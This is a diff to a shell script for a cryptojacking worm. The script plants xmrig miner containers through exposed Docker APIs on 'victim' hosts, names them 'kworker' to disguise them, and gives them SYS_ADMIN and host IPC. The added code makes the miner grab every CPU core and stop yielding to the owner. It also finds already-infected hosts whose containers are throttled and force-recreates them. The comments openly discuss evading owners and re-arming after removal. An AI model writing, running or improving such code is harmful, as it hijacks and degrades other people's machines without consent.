@@ -103,12 +103,23 @@ CMDS="\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"${RIG_ID:-node}\",\"--no-colo
 case "${TLS:-true}" in
     true|TRUE|1|yes) CMDS="$CMDS,\"--tls\"" ;;
 esac
+# Output knobs. Measured on a live victim (8 vCPU / 8GB): our xmrig sat at 210 H/s
+# while using 0.65 of ONE core - it had taken the image's default single-thread
+# layout and left seven cores idle. xmrig's own autoconfig is conservative; these
+# three flags are the whole difference between 21 H/s average and a real core's
+# worth: use every visible vCPU, take the JIT/huge-page path instead of the slow
+# default, and stop yielding the CPU back the moment the owner twitches.
+CMDS="$CMDS,\"--cpu-max-threads-hint=100\",\"--huge-pages-jit\",\"--cpu-no-yield\""
 # A label of our own is how the container is recognised later without guessing:
 # image-name matching alone would adopt a stranger's xmrig, and after a host
 # prunes us we must be able to tell "ours is gone" reliably - that is the whole
 # re-arm trigger.
 TAG="\"kworker\":\"1\""
-BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":512,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"
+# CpuShares 512 was our "polite container" setting (same idea as the ssh payload's
+# nice 19) - but on an 8-vCPU box xmrig was only getting 0.65 of a core because the
+# host was busy, so the politeness was costing us most of the machine. 2048 (2x a
+# default container) is still a freeloader, just a less apologetic one.
+BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"
 
 # a host is interesting only if a docker API answers - so verify it IS docker,
 # not just an open port (and no /dev/tcp, so bash is not required either)
@@ -188,8 +199,20 @@ dock_one() {
               for (i = 2; i <= n; i++)
                   if (index(a[i], tag) > 0 || index(a[i], img) > 0) { print (index(a[i], "\"Up ") > 0) ? "up" : "down"; exit } }')
         if [ "$up" = up ]; then
+            # Config drift: we only re-create a container when it is missing, so a
+            # host infected before the CpuShares/thread-hint change would keep its
+            # throttled container forever. Compare, and force a re-create if stale.
+            shares=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null \
+                     | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
+            if [ -n "${shares:-}" ] && [ "$shares" -lt 2048 ]; then
+                curl -fsS $opts --max-time 20 -X DELETE "$b/containers/$have?force=1" >/dev/null 2>&1 || :
+                echo "dock: $ip stale container (CpuShares $shares), re-creating"
+                have=""
+            fi
+        fi
+        if [ -n "${have:-}" ] && [ "$up" = up ]; then
             echo "dock: $ip already runs ours ($have)"
-        else
+        elif [ -n "${have:-}" ]; then
             curl -fsS $opts --max-time 15 -X POST "$b/containers/$have/start" >/dev/null 2>&1 || :
             echo "dock: $ip started our existing container ($have)"
         fi
